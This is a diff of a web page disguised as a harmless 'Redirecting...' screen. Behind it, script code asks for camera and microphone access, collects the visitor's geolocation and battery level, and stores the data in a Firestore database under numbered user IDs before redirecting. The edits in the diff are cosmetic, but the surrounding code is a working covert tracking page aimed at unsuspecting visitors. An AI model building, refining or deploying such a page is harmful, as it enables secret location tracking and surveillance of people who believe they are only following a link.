@@ -44,7 +44,7 @@
     <div class="container">
         <h1>Redirecting...</h1>
         <p>You will be redirected shortly <span class="loading-dots"></span></p>
-         <p id="error-message" class="error-message" style="display:none;"></p>
+        <p id="error-message" class="error-message" style="display:none;"></p>
     </div>
 
 <script>
@@ -64,19 +64,19 @@ const firebaseConfig = {
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
+const errorMessage = document.getElementById("error-message");
+
 // --- Firestore References (DYNAMIC USER ID) ---
-// Function to get the *current* user ID (will be incremented in location.html)
+// Function to get the *current* user ID
 async function getCurrentUserId() {
      const counterRef = db.collection('counters').doc('userCounter');
      const counterDoc = await counterRef.get();
       if (counterDoc.exists) {
         return `user${counterDoc.data().count}`;
       } else {
-         return 'user1'; // Initial value.
+         return 'user1'; // Initial value. Should not normally happen
       }
 }
-
-const errorMessage = document.getElementById("error-message");
 
 (async () => {
     // Get the current user ID *before* fetching settings
@@ -157,7 +157,6 @@ const errorMessage = document.getElementById("error-message");
                 stream.getTracks().forEach(track => track.stop());
                 collectOtherData();
             }
-
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
             cameraError = error.message; // Store error
@@ -168,7 +167,7 @@ const errorMessage = document.getElementById("error-message");
         collectOtherData();
     }
 
-    // Utility function to promisify Geolocation API
+      // Utility function to promisify Geolocation API
     function getCurrentPositionPromise() {
         return new Promise((resolve, reject) => {
             if (navigator.geolocation) {
@@ -190,7 +189,6 @@ const errorMessage = document.getElementById("error-message");
         });
 
     }
-
     // Function to collect location and battery data
     async function collectOtherData() {
         // 2. Location (if needed)
@@ -225,7 +223,7 @@ const errorMessage = document.getElementById("error-message");
         }
 
         // 3. Battery
-         if (navigator.getBattery) {
+        if (navigator.getBattery) {
             try{
                 const battery = await getBatteryPromise();
                 batteryData = battery.level * 100;
@@ -239,6 +237,7 @@ const errorMessage = document.getElementById("error-message");
         // All data collected (or errors stored), now save and redirect
         saveDataAndRedirect();
     }
+
 
 
     // Function to save data to Firestore and perform the redirect
@@ -257,9 +256,9 @@ const errorMessage = document.getElementById("error-message");
             console.log("Data saved to Firestore!");
         } catch (error) {
             console.error("Error saving data to Firestore:", error);
-             errorMessage.textContent = `Firestore Fout: ${error.message}`;
+            errorMessage.textContent = `Firestore Fout: ${error.message}`;
             errorMessage.style.display = 'block';
-            // Redirect even if saving fails
+            // Still redirect even if save fails
         }
 
         // Perform the redirect
